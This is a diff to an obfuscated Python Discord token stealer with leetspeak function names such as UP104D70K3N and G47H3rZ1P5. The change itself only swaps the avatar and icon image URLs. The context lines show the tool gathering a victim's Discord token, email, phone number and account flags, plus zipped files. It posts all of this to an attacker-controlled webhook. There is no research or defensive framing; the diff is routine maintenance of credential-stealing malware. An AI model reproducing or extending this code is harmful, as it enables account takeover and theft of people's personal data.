@@ -394,7 +394,7 @@ def UP104D70K3N(token, path):
     username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
     if pfp == None: 
-        pfp = "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+        pfp = "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -453,14 +453,14 @@ def UP104D70K3N(token, path):
                 },
             "footer": {
                 "text": f"{footerc}",
-                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+                "icon_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
+        "avatar_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4",
         "username": f"{cname}",
         "attachments": []
         }
@@ -495,12 +495,12 @@ def UP104D(name, link):
                     "color": 2895667,
                     "footer": {
                         "text": f"{footerc}",
-                        "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+                        "icon_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4"
                     }
                 }
             ],
             "username": f"{cname}",
-            "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
+            "avatar_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4",
             "attachments": []
             }
         L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
@@ -521,12 +521,12 @@ def UP104D(name, link):
                     "color": 2895667,
                     "footer": {
                         "text": f"{footerc}",
-                        "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+                        "icon_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4"
                     }
                 }
             ],
             "username": f"{cname}",
-            "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
+            "avatar_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4",
             "attachments": []
             }
         L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
@@ -549,12 +549,12 @@ def UP104D(name, link):
                 },
                 "footer": {
                     "text": f"{footerc}",
-                    "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+                    "icon_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4"
                 }
                 }
             ],
             "username": f"{cname}",
-            "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
+            "avatar_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4",
             "attachments": []
             }
         L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
@@ -733,12 +733,12 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             "color": 2895667,
             "footer": {
                 "text": f"{footerc}",
-                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+                "icon_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4"
             }
             }
         ],
         "username": f"{cname}",
-        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
+        "avatar_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4",
         "attachments": []
     }
     L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
